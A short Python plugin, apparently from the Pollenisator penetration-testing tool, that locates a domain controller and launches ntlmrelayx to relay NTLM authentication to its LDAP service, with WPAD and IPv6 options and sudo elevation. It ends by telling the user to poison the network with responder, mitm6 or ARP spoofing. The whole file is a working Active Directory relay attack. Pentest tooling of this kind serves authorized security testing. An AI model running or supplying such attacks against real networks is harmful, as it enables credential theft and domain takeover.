import subprocess
import psutil
import os
from pollenisatorgui.core.components.apiclient import APIClient
from pollenisatorgui.scripts.lan.utils import checkPath, findDc, getNICs


def main(apiclient, appli, **kwargs):
    res, path = checkPath(["ntlmrelayx.py", "ntlmrelayx"])
    if not res:
        return False, path
    APIClient.setInstance(apiclient)
    res, dc = findDc(apiclient, graphical=appli is not None)
    if not res:
        return False, dc
    try:
        device = getNICs(appli is not None)
    except ValueError as e:
        return False, str(e)
    if device is None or device.strip() == "":
        return False, "No ethernet device chosen"
    addrs = psutil.net_if_addrs()
    my_ip = addrs[device][0].address
    cmd = f"{path} -t ldap://{dc} -smb2support -wh {my_ip} -6" 
    if os.geteuid() != 0:
        cmd = "sudo "+cmd
    if appli:
        appli.launch_in_terminal(kwargs.get("default_target",None), "ntlmrelayx to ldapr", cmd, use_pollex=False)
    else:
        subprocess.run(cmd, shell=True)
    return True, f"Relaying is set up, poison the network using responder, mitm6, arp spoofing, etc."
